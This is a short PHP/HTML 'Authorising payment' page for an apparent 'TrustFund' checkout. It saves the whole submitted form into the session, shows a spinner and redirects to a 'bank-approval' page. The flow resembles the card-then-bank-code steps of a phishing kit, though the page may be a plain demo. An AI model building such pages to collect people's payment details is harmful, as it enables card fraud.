<?php

session_start();

$_SESSION['payment'] = $_POST;

?>

<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Authorising Payment | TrustFund</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<meta http-equiv="refresh" content="4;url=bank-approval.php">
<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#f5f5f5;
    font-family:Arial,sans-serif;

    display:flex;
    align-items:center;
    justify-content:center;

    height:100vh;
}

/* BOX */

.auth-box{
    background:white;
    width:420px;
    padding:50px 40px;
    border-radius:18px;
    text-align:center;
    border:1px solid #eee;
}

/* LOADER */

.loader{
    width:70px;
    height:70px;

    border:6px solid #eee;
    border-top:6px solid #9b59b6;

    border-radius:50%;

    margin:auto;

    animation:spin 1s linear infinite;
}

@keyframes spin{

    100%{
        transform:rotate(360deg);
    }

}

/* TITLE */

.auth-title{
    font-size:28px;
    font-weight:800;
    margin-top:35px;
    margin-bottom:14px;
    color:#111;
}

/* TEXT */

.auth-text{
    font-size:14px;
    color:#666;
    line-height:1.7;
}

.auth-bank{
    color:#9b59b6;
    font-weight:700;
}

</style>

</head>

<body>

<div class="auth-box">

<div class="loader"></div>

<div class="auth-title">

Authorising payment

</div>

<div class="auth-text">

Please wait while we securely verify your payment details.

<br><br>

Do not refresh or close this page.

</div>

</div>

</body>
</html>